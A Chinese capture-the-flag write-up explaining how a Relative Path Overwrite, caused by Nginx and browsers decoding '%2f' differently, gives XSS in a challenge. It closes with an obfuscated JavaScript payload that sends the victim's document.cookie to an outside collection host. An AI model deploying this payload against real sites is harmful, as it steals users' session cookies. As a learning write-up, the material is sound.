---
title: "强网杯中出现的 RPO 导致的 XSS"
date: 2018-03-25 22:28:25
tags: [writeup, web]
---

注意这里是 RPO (Relative Path Overwrite) 相对路径覆盖不是 PRO, 主要是利用 Nginx 服务端和客户端对 `%2f` 解析的差异.  
PS. 也就是说 Apache 是不会出现这个问题的, 它跟浏览器一样将 `%2f` 解析成名称的一部分而不是 `/` .  

<!-- more -->

Nginx 服务端可以正确识别 `%2f` 并将其解析成 `/` , 比如访问 `http://www.test.com/test/test2/..%2f..` , Nginx 会解析成`http://www.test.com/test1/test2/../..`, 最后服务端会返回 `http://www.test.com/` 的数据, 但客户端也就是浏览器, 不会解析 `%2f` 而是将其解析成 `http://www.test.com/test1/test2/..%2f..` , 将 `..%2f..` 当成一个在 `test1/test2/` 下的文件名. 这就造成了 xss 漏洞. 可以看到在 `http://39.107.33.96:20000/index.php` 中, 有一些相对路径的 `js` 文件, 如 `./jquery.min.js`.  
同时在本题中我们可以控制在 `http://39.107.33.96:20000/index.php/view/article/xxx/` 中的内容, 所以我们可以构造 `http://39.107.33.96:20000/index.php/view/article/xxx/..%2f..%2f..` 让 bot 访问.  
服务器返回的是 `http://39.107.33.96:20000/index.php` 的内容, 但浏览器加载的 `./jquery.min.js` 实际是`http://39.107.33.96:20000/index.php/view/article/xxx/jquery.min.js`, 同时这里 `/article/xxx/jquery.min.js` 被 rewrite 到了 `/article/xxx/`, 使 js 文件可控, 即导致了 xss 注入. 但这里服务器开了 `htmlspecialchars` , 同时开启了单引号转义, 最坑的是 phantomjs 不支持 ` 号. 想了半天用了 jsFuck, 又遇到了长度限制 1000, 而 jsFuck 长度随便就可以上万, 最后想到了可以从 ascii 中恢复字符串.
```js
var a=String.fromCharCode(0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x78,0x73,0x73,0x2e,0x72,0x6d,0x62,0x31,0x32,0x32,0x2e,0x63,0x6e,0x2f,0x3f,0x61,0x3d);
window.location.href=(a+document.cookie);
```
提交, 成功 get 到下一步. 
然后我就不会了 233, 听大佬们说要用 iframe , 然而压根没听过, 不过至少学了一手  RPO , 还不错.